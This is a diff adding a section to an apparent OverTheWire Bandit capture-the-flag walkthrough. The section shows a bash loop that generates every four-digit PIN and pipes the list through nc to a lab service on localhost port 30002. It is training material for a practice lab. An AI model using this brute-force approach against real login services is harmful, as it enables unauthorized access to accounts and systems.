@@ -295,3 +295,27 @@ cat /tmp/output_from_previous_command
    ```bash
    cat /tmp/bandit24_pass
    ```
+## Brute Forcing a 4 digit PIN
+The lab wants you to enter the password with a four digit pin.
+### **Steps to Solve**
+1. **To create a directory for the script:**
+   ```bash
+   mkdir /tmp/brute
+   ```
+2. **Writing the custom script:**
+   ```bash
+   nano script.sh
+   #!/bin/bash
+   for i in {0..9}{0..9}{0..9}{0..9}
+   do
+   echo "password $i" >> list.txt
+   done
+   ```
+3. **Executing the script:**
+   ```sh
+   ./script.sh
+   ```
+4. **Brute Forcing:**
+   ```sh
+   cat list.txt | nc localhost 30002
+   ```
